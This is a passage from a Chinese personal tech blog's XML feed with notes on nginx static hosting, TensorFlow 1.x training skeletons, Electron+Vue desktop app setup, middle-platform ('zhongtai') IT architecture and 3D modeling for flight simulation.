<li><a href="https://coolshell.cn/articles/10590.html" target="_blank" rel="noopener">二维码的生成细节和原理</a>,by 陈皓.</li>
<li><a href="https://juejin.im/post/5a75466f5188257a5c6040d2" target="_blank" rel="noopener">微信小程序中生成二维码工具：weapp.qrcode.js</a>,by yingye.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机图形学</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx静态资源服务器配置方法</title>
    <url>/2022/05/19/nginx%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>为提供静态资源web服务，安装好nginx后，进入nginx安装目录的conf目录下，修改nginx.conf文件，配置如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">       listen 88;</span><br><span class="line">       server_name localhost;</span><br><span class="line">       # root     &#x2F;home&#x2F;ubuntu&#x2F;static&#x2F;;</span><br><span class="line">       root D:&#x2F;PortableApp&#x2F;nginx-1.21.6&#x2F;test;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/name_is_wl/article/details/52958472" target="_blank" rel="noopener">nginx静态资源服务器简单配置</a>,by wllllllllllllllll.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>tensorflow学习笔记</title>
    <url>/2018/10/14/tensorflow%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>TensorFlow™ 是一个开放源代码软件库，用于进行高性能数值计算。借助其灵活的架构，用户可以轻松地将计算工作部署到多种平台（CPU、GPU、TPU）和设备（桌面设备、服务器集群、移动设备、边缘设备等）。TensorFlow™ 最初是由 Google Brain 团队（隶属于 Google 的 AI 部门）中的研究人员和工程师开发的，可为机器学习和深度学习提供强力支持，并且其灵活的数值计算核心广泛应用于许多其他科学领域。</p>
<h1 id="tensorflow入门"><a href="#tensorflow入门" class="headerlink" title="tensorflow入门"></a>tensorflow入门</h1><p>tensorflow实现机器学习的基本步骤如下：</p>
<ol>
<li>定义模型，建立数据流图</li>
<li>定义loss，并指定优化器 </li>
<li>传入数据并进行训练 </li>
<li>使用测试集进行评测</li>
</ol>
<h2 id="通用代码框架"><a href="#通用代码框架" class="headerlink" title="通用代码框架"></a>通用代码框架</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import tensorflow as tf</span><br><span class="line"></span><br><span class="line"># 初始化变量和模型参数，定义训练闭环中的运算</span><br><span class="line"></span><br><span class="line">def inference(X):</span><br><span class="line">    # 计算推断模型在数据X上的输出，并将结果返回</span><br><span class="line"></span><br><span class="line">def loss(X,Y):</span><br><span class="line">    # 依据训练数据X及其期望输出Y计算损失</span><br><span class="line"></span><br><span class="line">def inputs():</span><br><span class="line">    # 读取或生成训练数据X及其期望输出Y</span><br><span class="line"></span><br><span class="line">def train(total_loss):</span><br><span class="line">    # 依据计算的总损失训练或调整模型参数</span><br><span class="line"></span><br><span class="line">def evaluate(sess,X,Y):</span><br><span class="line">    # 对训练得到的模型进行评估</span><br><span class="line"></span><br><span class="line"># 在一个会话对象中启动数据流图，搭建流程</span><br><span class="line">with tf.Session() as sess:</span><br><span class="line">    tf.initialize_all_variables().run()</span><br><span class="line">    </span><br><span class="line">    X,Y&#x3D;inputs()</span><br><span class="line">    </span><br><span class="line">    total_loss&#x3D;loss(X,Y)</span><br><span class="line">    train_op&#x3D;train(total_loss)</span><br><span class="line">    </span><br><span class="line">    coord&#x3D;tf.train.Coordinator()</span><br><span class="line">    threads&#x3D;tf.train.start_queue_runners(sess&#x3D;sess,coord&#x3D;coord)</span><br><span class="line"></span><br><span class="line">    # 实际的训练迭代次数</span><br><span class="line">    training_steps&#x3D;1000</span><br><span class="line">    for step in range(training_steps):</span><br><span class="line">        sess.run([train_op])</span><br><span class="line">        # 出于调试和学习的目的，查看损失在训练过程中递减的情况</span><br><span class="line">        if step % 10 &#x3D;0:</span><br><span class="line">            print &quot;loss: &quot;,sess.run([total_loss])</span><br><span class="line"></span><br><span class="line">    evaluate(sess,X,Y)</span><br><span class="line"></span><br><span class="line">    coord.request_stop()</span><br><span class="line">    coord.join(threads)</span><br><span class="line">    sess.close()</span><br></pre></td></tr></table></figure>

<h2 id="保存训练检查点"><a href="#保存训练检查点" class="headerlink" title="保存训练检查点"></a>保存训练检查点</h2><p>借助tf.train.Saver类可创建检查点文件，将数据流图中变量保存至其中。修改后框架如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 模型定义代码</span><br><span class="line"># 创建一个Saver对象</span><br><span class="line">saver&#x3D;tf.train.Saver()</span><br><span class="line"></span><br><span class="line"># 在会话对象中启动数据流图，搭建流程</span><br><span class="line">with tf.Session() as sess:</span><br><span class="line">    # 模型设置</span><br><span class="line"></span><br><span class="line">    # 实际的训练闭环</span><br><span class="line">    for step in range(training_steps):</span><br><span class="line">        sess.run([train_op])</span><br><span class="line"></span><br><span class="line">        if step % 1000 &#x3D;&#x3D;0</span><br><span class="line">            # 将创建遵循命名模板为my-model-&#123;step&#125;的检查点文件，默认保存最近的5个文件</span><br><span class="line">            saver.save(sess,&#39;my-model&#39;,global_step&#x3D;step)</span><br><span class="line">    </span><br><span class="line">    # 模型评估</span><br><span class="line"></span><br><span class="line">    saver.save(sess,&#39;my-model&#39;,global_step&#x3D;training_steps)</span><br><span class="line">    sess.close()</span><br></pre></td></tr></table></figure>
<p>如果希望从检查点恢复，则使用tf.train.get_checkpoint_state方法验证检查点文件的存在，并使用tf.train.Saver.restore方法恢复变量值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">with tf.Session() as sess:</span><br><span class="line">    # 模型设置</span><br><span class="line"></span><br><span class="line">    initial_step&#x3D;0</span><br><span class="line"></span><br><span class="line">    # 验证之前是否已经保存了检查点文件</span><br><span class="line">    ckpt&#x3D;tf.train.get_checkpoint_state(os.path.dirname(__file__))</span><br><span class="line">    if ckpt and ckpt.model_checkpoint_path:</span><br><span class="line">        # 从检查点恢复模型参数</span><br><span class="line">        saver.restore(sess,ckpt.model_checkpoint_path)</span><br><span class="line">        initial_step&#x3D;int(ckpt.model_checkpoint_path.rsplite(&#39;_&#39;,1)[1])</span><br><span class="line"></span><br><span class="line">    # 实际的训练闭环</span><br><span class="line">    for step in range(initial_step, training_steps):</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol>
<li><a href="https://www.tensorflow.org/guide/tensor?hl=zh_cn" target="_blank" rel="noopener">TensorFlow指南</a>,by tensorflow.</li>
<li><a href="https://www.mcoder.cc/DL-notes/posts/try_to_understand_shape.html" target="_blank" rel="noopener">尝试理解 shape 的用法</a>,by mcoder.</li>
<li><a href="https://blog.csdn.net/liuyanfeier/article/details/53731239" target="_blank" rel="noopener">Python中的列表（list），元组（Tuple），字典（Dict）和集合（Set）</a>,by liuyanfeier.</li>
<li><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017092876846880" target="_blank" rel="noopener">使用list和tuple</a>,by liaoxuefeng.</li>
<li><a href="https://blog.csdn.net/lxlong89940101/article/details/84314703" target="_blank" rel="noopener">Python的reshape(-1,1)</a>,by lxlong89940101.</li>
<li><a href="https://numpy.org/doc/stable/reference/generated/numpy.array.html" target="_blank" rel="noopener">numpy.array</a>,by numpy.</li>
<li><a href="https://docs.pythontab.com/tensorflow/" target="_blank" rel="noopener">TensorFlow 官方文档中文版</a>,by pythontab.</li>
<li><a href="https://blog.csdn.net/down_load_er/article/details/101520529" target="_blank" rel="noopener">numpy.array shape (R, 1) and (R,) 的区别</a>,by 时间被海绵吃了2.</li>
<li><a href="https://blog.csdn.net/qq_36342854/article/details/108247492" target="_blank" rel="noopener">tf.variable_scope中的reuse</a>,by 超级无敌小小顺利.</li>
<li><a href="https://chiang97912.github.io/2019/02/25/tensorflow%E5%85%B1%E4%BA%AB%E5%8F%98%E9%87%8F%E6%9C%BA%E5%88%B6%E7%90%86%E8%A7%A3%E4%B8%8E%E5%BA%94%E7%94%A8/" target="_blank" rel="noopener">Tensorflow共享变量机制理解与应用</a>,by BetterManPeter.</li>
<li><a href="https://blog.csdn.net/TeFuirnever/article/details/88929223" target="_blank" rel="noopener">tf.reduce_mean()函数解析（最清晰的解释）</a>,by 我是管小亮.</li>
<li><a href="https://www.extutorial.com/blog/2433994" target="_blank" rel="noopener">深度解析OPENAI-MADDPG</a>,by 起点教程.</li>
<li><a href="https://zhuanlan.zhihu.com/p/268100059" target="_blank" rel="noopener">diagonal Gaussian policies的一些理解</a>,by Intuition.</li>
<li><a href="https://zhuanlan.zhihu.com/p/54706353" target="_blank" rel="noopener">强化学习随机策略之高斯似然数原理与代码实现</a>,by 神奇的战士.</li>
<li><a href="https://www.shidata.com/2018/01/19/likelihood/" target="_blank" rel="noopener">数学基础——浅谈似然</a>,by shidata.</li>
<li><a href="https://python.iitter.com/other/48330.html" target="_blank" rel="noopener">gym中的discrete类、box类和multidiscrete类简介和使用</a>,by iitter.</li>
<li><a href="https://zachary2wave.github.io/OPENAI-Baeslines-%E8%AF%A6%E8%A7%A3-%E9%9B%B6-%E6%80%BB%E4%BD%93-%E4%B8%AD%E6%96%87/" target="_blank" rel="noopener">OPENAI Baeslines 详解（零）综述</a>,by zachary2wave.</li>
<li><a href="https://zhuanlan.zhihu.com/p/91497695" target="_blank" rel="noopener">强化学习Gym库学习实践(一）</a>,by 愣娃RC.</li>
<li><a href="https://zhuanlan.zhihu.com/p/338428207" target="_blank" rel="noopener">Gym使用简介</a>,by Lisnol.</li>
<li><a href="https://zhuanlan.zhihu.com/p/32528578" target="_blank" rel="noopener">左右互搏，self-play，《Emergent Complexity via Multi-Agent Competition》</a>,by 王小惟 Weixun.</li>
<li><a href="https://blog.csdn.net/qq_41871826/article/details/110678626" target="_blank" rel="noopener">多智能体深度强化学习——MADDPG算法代码分析（tensorflow）</a>,by RavenRaaven.</li>
<li><a href="https://zhuanlan.zhihu.com/p/150114190" target="_blank" rel="noopener">多元高斯分布以及高斯分布微分熵</a>,by 侠肝义胆陈浩天.</li>
<li><a href="https://zhuanlan.zhihu.com/p/52087724" target="_blank" rel="noopener">tf.split 与 tf.squeeze 用法</a>,by 应钟有微.</li>
<li><a href="https://zhuanlan.zhihu.com/p/59550457" target="_blank" rel="noopener">碎片化学习之数学（二）：Categorical Distribution</a>,by 李新春.</li>
<li><a href="https://www.jiqizhixin.com/articles/2019-09-21-4" target="_blank" rel="noopener">Distribution is all you need：这里有12种做ML不可不知的分布</a>,by 机器之心.</li>
<li><a href="https://blog.csdn.net/ningning52107/article/details/80227262" target="_blank" rel="noopener">tensorflow中axis理解非常重要</a>,by 爱视觉.</li>
<li><a href="https://www.iotstu.com/post/130.html" target="_blank" rel="noopener">tensorflow中四种不同交叉熵函数tf.nn.softmax_cross_entropy_with_logits()</a>,by iotstu.</li>
<li><a href="https://zhuanlan.zhihu.com/p/33560183" target="_blank" rel="noopener">TF里几种loss和注意事项</a>,by 崔权.</li>
<li><a href="https://zhuanlan.zhihu.com/p/356976844" target="_blank" rel="noopener">Softmax函数和Sigmoid函数的区别与联系初识CV</a>,by 初识CV.</li>
<li><a href="https://zhuanlan.zhihu.com/p/35709485" target="_blank" rel="noopener">损失函数｜交叉熵损失函数</a>,by 飞鱼Talk.</li>
<li><a href="https://blog.csdn.net/UESTC_C2_403/article/details/72233523" target="_blank" rel="noopener">tf.random_uniform的使用</a>,by UESTC_C2_403.</li>
<li><a href="https://www.cnblogs.com/gczr/p/7674572.html" target="_blank" rel="noopener">sparse_softmax_cross_entropy_with_logits与softmax_cross_entropy_with_logits</a>,by 光彩照人.</li>
<li><a href="https://zhuanlan.zhihu.com/p/153535799" target="_blank" rel="noopener">关于LogSumExp</a>,by Hurry Z.</li>
<li><a href="https://zhuanlan.zhihu.com/p/129639768" target="_blank" rel="noopener">softmax 与 log sum exp</a>,by 我要给主播生猴子.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
        <tag>tensorflow</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Electron和Vuejs创建桌面应用程序的方法</title>
    <url>/2020/11/10/%E4%BD%BF%E7%94%A8Electron%E5%92%8CVuejs%E5%88%9B%E5%BB%BA%E6%A1%8C%E9%9D%A2%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>最近遇到一个奇特的需求，要求构建一个评估系统，分为前后端。它的前端是桌面应用程序，后端也是桌面应用程序。前后端之间的通信是通过前端导出一个数据包文件，然后交给后端导入完成的。由于熟悉Nodejs前后端开发，我选择Electron加Vuejs的解决方案。具体的技术选型如下：</p>
<ul>
<li>前端：electron+vuejs+indexedDB+localForage，前端程序需要存储数据，但数据量会比较小，通常使用indexedDB就足够了。</li>
<li>后端：electron+vuejs+sqlite3+sequlize，后端程序会汇总前端程序导出的数据包，并做一些统计查询，存储数据量大，读写效率要求高。因此选择sqlite3数据库，可随electron打包到一起安装。</li>
</ul>
<h1 id="技术简介"><a href="#技术简介" class="headerlink" title="技术简介"></a>技术简介</h1><h2 id="Electron简介"><a href="#Electron简介" class="headerlink" title="Electron简介"></a>Electron简介</h2><p>Electron（原名为Atom Shell）是GitHub开发的一个开源框架。它允许使用Node.js（作为后端）和Chromium（作为前端）完成桌面GUI应用程序的开发。Electron现已被多个开源Web应用程序用于前端与后端的开发，著名项目包括GitHub的Atom和微软的Visual Studio Code。</p>
<p>一个基础的Electron包含三个文件：package.json（元数据）、main.js（代码）和index.html（图形用户界面）。框架由Electron可执行文件（Windows中为electron.exe、macOS中为electron.app、Linux中为electron）提供。开发者可以自行添加标志、自定义图标、重命名或编辑Electron可执行文件。</p>
<h2 id="vuejs简介"><a href="#vuejs简介" class="headerlink" title="vuejs简介"></a>vuejs简介</h2><p>Vue.js是一款流行的JavaScript前端框架，旨在更好地组织与简化Web开发。Vue所关注的核心是MVC模式中的视图层，同时，它也能方便地获取数据更新，并通过组件内部特定的方法实现视图与模型的交互。</p>
<p>Vuejs适合开发单页应用程序。</p>
<h2 id="indexedDB数据库简介"><a href="#indexedDB数据库简介" class="headerlink" title="indexedDB数据库简介"></a>indexedDB数据库简介</h2><p>IndexedDB 是一种底层 API，用于在客户端存储大量的结构化数据（也包括文件/二进制大型对象（blobs））。该 API 使用索引实现对数据的高性能搜索。虽然 Web Storage 在存储较少量的数据很有用，但对于存储更大量的结构化数据来说力不从心。而 IndexedDB 提供了这种场景的解决方案。</p>
<p>IndexedDB 是一个事务型数据库系统，类似于基于 SQL 的 RDBMS。 然而，不像 RDBMS 使用固定列表，IndexedDB 是一个基于 JavaScript 的面向对象数据库。IndexedDB 允许您存储和检索用键索引的对象；可以存储结构化克隆算法支持的任何对象。您只需要指定数据库模式，打开与数据库的连接，然后检索和更新一系列事务。</p>
<p>indexedDB的API不够友好，建议使用localForage，支持类Storage API语法的客户端数据存储polyfill，支持回退到Storage和Web SQL</p>
<h1 id="项目构建过程"><a href="#项目构建过程" class="headerlink" title="项目构建过程"></a>项目构建过程</h1><h2 id="构建Vuejs项目"><a href="#构建Vuejs项目" class="headerlink" title="构建Vuejs项目"></a>构建Vuejs项目</h2><p>使用如下命令构建Vuejs项目脚手架：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install -g @vue&#x2F;cli</span><br><span class="line">vue create vue-electron-app</span><br><span class="line"># 可选，添加组件</span><br><span class="line">vue add vuetify</span><br><span class="line"># 使用如下命令查看脚手架效果</span><br><span class="line">npm run serve</span><br></pre></td></tr></table></figure>

<h2 id="构建Electron项目"><a href="#构建Electron项目" class="headerlink" title="构建Electron项目"></a>构建Electron项目</h2><p>在上一节创建Vuejs项目的基础上，使用如下命令为Vuejs项目添加Electron支持，从而生成桌面应用程序：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vue add electron-builder</span><br><span class="line"># 查看Electron效果</span><br><span class="line">npm run electron:serve</span><br></pre></td></tr></table></figure>

<h2 id="构建Sqlite3数据库"><a href="#构建Sqlite3数据库" class="headerlink" title="构建Sqlite3数据库"></a>构建Sqlite3数据库</h2><p>使用如下命令为项目添加Sqlite3数据库支持：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install sequelize --save --registry https:&#x2F;&#x2F;registry.npm.taobao.org</span><br><span class="line">npm install sqlite3 --save --registry https:&#x2F;&#x2F;registry.npm.taobao.org</span><br></pre></td></tr></table></figure>

<h2 id="构建32位安装程序"><a href="#构建32位安装程序" class="headerlink" title="构建32位安装程序"></a>构建32位安装程序</h2><p>使用如下命令构建32位Electron安装程序：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm run electron:build -- --ia32</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yarn electron:build --ia32</span><br></pre></td></tr></table></figure>

<h1 id="问题备注"><a href="#问题备注" class="headerlink" title="问题备注"></a>问题备注</h1><h2 id="Electron构建程序下载依赖包失败"><a href="#Electron构建程序下载依赖包失败" class="headerlink" title="Electron构建程序下载依赖包失败"></a>Electron构建程序下载依赖包失败</h2><p>请参考 <a href="https://www.cnblogs.com/BlueBerryCode/p/13451702.html" target="_blank" rel="noopener">Electron：运行npm run build构建环境失败解决方案</a>。</p>
<h2 id="Electron-makensis构建失败"><a href="#Electron-makensis构建失败" class="headerlink" title="Electron makensis构建失败"></a>Electron makensis构建失败</h2><p>当遇到如下错误时, 解决方法很简单,打包项目路径不能包含中文路径。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.electron-builder\Cache\nsis\nsis-3.0.3.2\Bin\makensis.exe exited with code  ERR_ELECTRON_BUILDER_CANNOT_EXECUTE</span><br></pre></td></tr></table></figure>

<h2 id="Electron-Vuejs显示空白页"><a href="#Electron-Vuejs显示空白页" class="headerlink" title="Electron Vuejs显示空白页"></a>Electron Vuejs显示空白页</h2><p>请参考<a href="https://nklayman.github.io/vue-cli-plugin-electron-builder/guide/commonIssues.html#blank-screen-on-builds-but-works-fine-on-serve" target="_blank" rel="noopener">Blank screen on builds, but works fine on serve</a>。</p>
<h2 id="支持平台"><a href="#支持平台" class="headerlink" title="支持平台"></a>支持平台</h2><p>electron支持macOS、Windows、Linux。在Windows平台，electron仅支持 Windows 7 或更高版本, 旧版操作系统已不再支持(并且无法运行).</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://itnext.io/electron-application-with-vue-js-and-vuetify-f2a1f9c749b8" target="_blank" rel="noopener">Create an Electron application with Vue and Vuetify</a>,by bromix.</li>
<li><a href="https://www.cnblogs.com/BlueBerryCode/p/13451702.html" target="_blank" rel="noopener">Electron：运行npm run build构建环境失败解决方案</a>,by 请给我一杯冰可乐.</li>
<li><a href="https://github.com/nklayman/vue-cli-plugin-electron-builder/issues/251" target="_blank" rel="noopener">How to build app for Windows 32bit version?</a>,by nklayman.</li>
<li><a href="https://www.electronjs.org/docs/tutorial/support#supported-platforms" target="_blank" rel="noopener">支持平台</a>,by electronjs.</li>
<li><a href="https://shenlvmeng.github.io/blog/2019/03/12/indexeddb-introduction/" target="_blank" rel="noopener">Electron应用数据库选型暨indexedDB扫盲</a>,by shenlvmeng.</li>
<li><a href="https://localforage.docschina.org/" target="_blank" rel="noopener">LOCALFORAGE</a>,by localforage.</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/IndexedDB_API" target="_blank" rel="noopener">IndexedDB</a>,by mozilla.</li>
<li><a href="https://www.ruanyifeng.com/blog/2018/07/indexeddb.html" target="_blank" rel="noopener">浏览器数据库 IndexedDB 入门教程</a>,by ruanyifeng.</li>
<li><a href="https://zhuanlan.zhihu.com/p/100837343" target="_blank" rel="noopener">electron集成sqlite3，win10上折腾了2天</a>,by 兴哥.</li>
<li><a href="https://www.cnblogs.com/fer-team/p/13367927.html" target="_blank" rel="noopener">Electron笔记</a>,by 小羽信息.</li>
<li><a href="https://nklayman.github.io/vue-cli-plugin-electron-builder/guide/commonIssues.html#blank-screen-on-builds-but-works-fine-on-serve" target="_blank" rel="noopener">Blank screen on builds, but works fine on serve</a>,by Vue CLI Plugin Electron Builder.</li>
<li><a href="https://stackoverflow.com/questions/39091964/remove-menubar-from-electron-app" target="_blank" rel="noopener">Remove menubar from Electron app</a>,by stackoverflow.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>企事业单位IT架构的涅槃与重生之中台</title>
    <url>/2019/12/08/%E4%BC%81%E4%BA%8B%E4%B8%9A%E5%8D%95%E4%BD%8DIT%E6%9E%B6%E6%9E%84%E7%9A%84%E6%B6%85%E6%A7%83%E4%B8%8E%E9%87%8D%E7%94%9F%E4%B9%8B%E4%B8%AD%E5%8F%B0/</url>
    <content><![CDATA[<p>近年来，企事业单位IT建设如火如荼，取得了很多的成果，极大地提高了企事业单位的工作效率。但同时企事业IT建设中存在的数据管理问题、业务管理问题不容忽视。在企事业单位IT建设的早期，项目之间没有整体规划，缺乏统一管理，造成数据孤岛、数据标准化缺失、数据存储杂乱、数据使用泛滥等数据管理问题，同时业务方面也存在重复建设、人亡政息、部门分割、多头管理等业务管理问题。中台架构即是针对上述问题，对企事业IT建设的涅槃和重生。</p>
<h1 id="中台由来"><a href="#中台由来" class="headerlink" title="中台由来"></a>中台由来</h1><p>在传统企业IT架构中，通常分成前台和后台。前台即包括各种和用户直接交互的界面，比如web页面、手机app；也包括服务端各种实时响应用户请求的业务逻辑，比如商品查询、订单系统等等。而后台并不直接面向用户，而是面向运营人员的配置管理系统，比如商品管理、物流管理、结算管理。后台为前台提供了一些简单的配置。</p>
<p>在企业竞争不够激烈时，这种IT架构能够满足用户需求，虽然易造成数据冗余、数据孤岛、数据杂乱等问题。而今天随着互联网的蓬勃发展，企业竞争越来越激烈，用户也越来越挑剔。只有以用户为中心，快速影响用户的需求，不断迭代和试错，才能让企事业在竞争当中立于不败，才能更加满足用户的需求。于是中台架构应运而生。</p>
<p>中台架构本质上是对传统前后台IT架构的重构，尤其是后台的重构。在传统的IT架构中，通常会遇到如下两类问题：</p>
<ul>
<li>一类是，许多业务需求或功能需求高度类似、通用化程度很高，但是由于没有专门的团队负责规划和开发，大量的系统重复开发、重复建设，导致复用性低、效率低、产研资源浪费、用户体验不统一。</li>
<li>另一类是，早期业务发展过程中，为了解决一些当下的业务问题，垂直的、个性化的业务逻辑与基础系统耦合太深，由于没有平台性质的规划，横向系统之间、上下游系统之间的交叉逻辑也非常多，这样导致在新业务、新市场的拓展过程中，系统没法直接复用，甚至没法快速迭代。</li>
</ul>
<p>这两类问题，在软件开发领域，有专门的名称，叫做“重复造轮子”和“烟囱式架构”。中台的诞生即为了避免“重复造轮子”的尴尬和“烟囱式架构”的无序发展。</p>
<p>中台是真正为前台而生的平台（可以是技术平台，业务能力甚至是组织机构），它存在的唯一目的就是更好的服务前台规模化创新，进而更好的响应服务引领用户，使企业真正做到自身能力与用户需求的持续对接。</p>
<p>中台就像是在前台与后台之间添加的⼀组“变速⻮轮”，将前台与后台的速率进行匹配，是前台与后台的桥梁。它为前台而生，易于前台使用，将后台资源顺滑流向用户，响应用户。</p>
<h1 id="中台价值"><a href="#中台价值" class="headerlink" title="中台价值"></a>中台价值</h1><p>中台的存在价值是为它的客户服务，比如业务中台和数据中台要快速响应前台应用的需求。中台建设的价值，在于帮助企业搭建更加适应企业数字化转型的全新IT架构。或者说，中台架构本身就是企业全新IT架构的核心内容和骨干系统，让企业IT运营更加顺畅，更能帮助企业尝试新的商业模式，完成战略转型的目的。</p>
<h1 id="中台构建"><a href="#中台构建" class="headerlink" title="中台构建"></a>中台构建</h1><p>根据功能和角色的不同，中台可分为：</p>
<ul>
<li>业务中台：通过各个项目的共通业务进行下沉，整合成通用的服务平台。</li>
<li>技术中台：为了避免研发人员重复发明轮子，向各个项目提供通用的底层框架、引擎、中间件。</li>
<li>数据中台：为各个项目进行各种数据采集和分析。</li>
<li>算法中台：为各个项目提供算法能力，比如推荐算法、搜索算法、图像识别、语音识别等等。</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://juejin.im/post/5d995f82f265da5ba308389d" target="_blank" rel="noopener">漫画：什么是中台？</a>,by 程序员小灰.</li>
<li><a href="https://www.zhihu.com/question/57717433" target="_blank" rel="noopener">互联网公司中所谓中台是怎么定义的？</a>,by zhihu.</li>
<li><a href="https://insights.thoughtworks.cn/what-is-zhongtai/" target="_blank" rel="noopener">白话中台战略：中台是个什么鬼?</a>,by 王健.</li>
<li><a href="https://www.infoq.cn/article/7z0JSGIIxFydDYS5tWfO" target="_blank" rel="noopener">中台战略全解读（一）：中台的发展与进化</a>,by 陈新宇等.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title>三维建模方法简介</title>
    <url>/2018/12/05/%E4%B8%89%E7%BB%B4%E5%BB%BA%E6%A8%A1%E6%96%B9%E6%B3%95%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<p>三维建模是一种常用技术，奈何心向往之，却没有时间去系统学习，也没有做出过一个作品。下面将我看到的一些好的有关三维建模的资料记录一下，以做备忘。</p>
<h1 id="三维建模方法"><a href="#三维建模方法" class="headerlink" title="三维建模方法"></a>三维建模方法</h1><h2 id="选择软件"><a href="#选择软件" class="headerlink" title="选择软件"></a>选择软件</h2><p>当前三维软件层出不穷，既有商业级的3ds MAX、MAYA、Creator，也有免费使用的Blender、MilkShape。</p>
<h2 id="下载蓝图"><a href="#下载蓝图" class="headerlink" title="下载蓝图"></a>下载蓝图</h2><p>飞行仿真的三维模型主要有飞行器、机场建筑等。和大多数虚拟现实中使用的模型一样，并不需要CAD级别的精度，一般是下载一些图片或飞机整体蓝图作为蓝本，采用多边形建模的方法分部建模。蓝图下载网址首推：</p>
<p><a href="http://www.the-blueprints.com/" target="_blank" rel="noopener">the‑blueprints.com</a></p>
<p>这里免费提供各种汽车、国内外飞机、船舶的三视图图纸下载。</p>
<h2 id="多边形建模"><a href="#多边形建模" class="headerlink" title="多边形建模"></a>多边形建模</h2><p>采用下载的蓝图，作为贴图放置在相应的投影平面上，然后采用多边形建模的方法画出各部分细节。多边形建模的思想就是采用一个诸如一个最接近的多边形，进行点线面的操作就可以绘制出复杂的飞机外形。</p>
<p>多边形建模从最基本的外形开始变形，可以从点线面及整体四个级别的操作，在越需要突出外形细节处用越多的点，通过建立网格模型，然后使用网格平滑功能生成平滑的曲面模型。</p>
<p>建模时不能有重复的点线面等几何体，否则即使表面上已经贴好了材质，但载入程序后，往往会因为Z向深度冲突的原因产生闪烁效果。其细节取决于您的需求，需要花费大量的时间。</p>
<h2 id="贴图"><a href="#贴图" class="headerlink" title="贴图"></a>贴图</h2><p>真实世界的模型带有各种彩色并具有光泽度。完成了几何体的建模对于一个模型来说只完成了一小半工作，还需要给模型添加材质。</p>
<p>与一般的模型不同，飞行器出于气动设计的考虑，其表面模型一般成流线型的曲面，且部件组成复杂，界线较难区分，即使是UVW贴图也难以胜任。因此，对飞行器的贴图主要采用3ds MAX的UVW展开贴图技术贴图。</p>
<p>一个模型最好只有一个贴图，因为贴图数目过多零散会影响计算机载入三维模型时间和效率。因此，一般将整个模型各个部件组合为一个多边形，各部件为元素，待完成UVW贴图后再分离成单独的部件。UVW展开贴图有多重形式，如长方体展开（即按六个视图投影）、平面展开等，按需选择。</p>
<p>在一张贴图上展开整个模型的UV坐标显然是有限的，需要根据现实精度调整各个部分的贴图大小。保存这些展开的贴图坐标并渲染输出UV模板图像文件。UV模板图像其实就是整个模型的贴图的界线图像，通过Photoshop等图像处理软件处理，采用尽可能真实的图像放置在对应的区域。最后将材质赋给对象即完成贴图渲染。</p>
<h2 id="数据导出"><a href="#数据导出" class="headerlink" title="数据导出"></a>数据导出</h2><p>直接采用3ds MAX绘制的三维模型当然是<em>.max格式，它不能为外界程序读取。这时就需要根据自己的开发环境选择导出的数据格式，比如用开源的OSG做仿真开发，就需要OSGExp插件的支持，导成</em>.ive、<em>.osg、</em>.osgb等格式即可。但无论导出何种格式，<strong>切记保证模型质心与建模的原点不能相差不远，还要注意光照、贴图格式以及单位问题</strong>。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/34555581" target="_blank" rel="noopener">飞行仿真–1.三维建模篇</a>,by WFYX.</li>
<li><a href="https://www.zhihu.com/question/381828861/answer/1206628295" target="_blank" rel="noopener">调整边缘画笔工具怎么用？</a>,by zhihu.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
      </tags>
  </entry>
  <entry>
    <title>使用python3+PyQt5+PyCharm桌面GUI开发</title>
    <url>/2019/06/29/%E4%BD%BF%E7%94%A8python3-PyQt5-pycharm%E6%A1%8C%E9%9D%A2GUI%E5%BC%80%E5%8F%91/</url>
    <content><![CDATA[<p>下面简单介绍基于Python3、PyQt5和PyCharm进行桌面GUI开发。</p>
